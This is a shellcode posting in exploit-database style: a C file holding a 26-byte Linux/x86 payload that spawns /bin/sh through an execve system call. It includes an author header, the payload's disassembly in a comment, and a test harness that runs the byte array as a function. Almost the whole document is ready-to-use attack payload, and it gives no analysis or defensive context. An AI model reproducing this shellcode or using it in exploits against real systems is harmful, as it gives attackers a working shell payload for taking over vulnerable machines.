/*
#[+] Author: e55db081d05f58a
#[+] Title: Shellcode: Linux/x86 - /bin/sh - 26 bytes
#[+] Type:Shellcode
#[+] Tested on: 4.0.5-antix.1-486-smp i686
#[+] Twitter: @e55db081d05f58a
=====================================================
         
=====================================================
Disassembly of section .text:
 080483d0 <main>:
 80483d0:	31 c0                	xor    eax,eax
 80483d2:	50                   	push   eax
 80483d3:	68 6e 2f 73 68       	push   0x68732f6e
 80483d8:	68 2f 2f 62 69       	push   0x69622f2f
 80483dd:	89 e3                	mov    ebx,esp
 80483df:	50                   	push   eax
 80483e0:	53                   	push   ebx
 80483e1:	89 e1                	mov    ecx,esp
 80483e3:	50                   	push   eax
 80483e4:	89 c2                	mov    edx,eax
 80483e6:	b0 0b                	mov    al,0xb
 80483e8:	cd 80                	int    0x80
*/

#include <stdio.h>
#include <string.h>
int main(int argc,char **argv){
	char shellcode[]="\x31\xc0"
			 "\x50"
			 "\x68\x6e\x2f\x73\x68"
			 "\x68\x2f\x2f\x62\x69"
			 "\x89\xe3"
			 "\x50"
			 "\x53"
			 "\x89\xe1"
			 "\x50"
			 "\x89\xc2"
			 "\xb0\x0b"
			 "\xcd\x80";
	int (*f)();
	f=(int(*)())shellcode;
	//printf("Length shellcode: %d",strlen(shellcode));
	(int)(*f)();
	return 0;
}
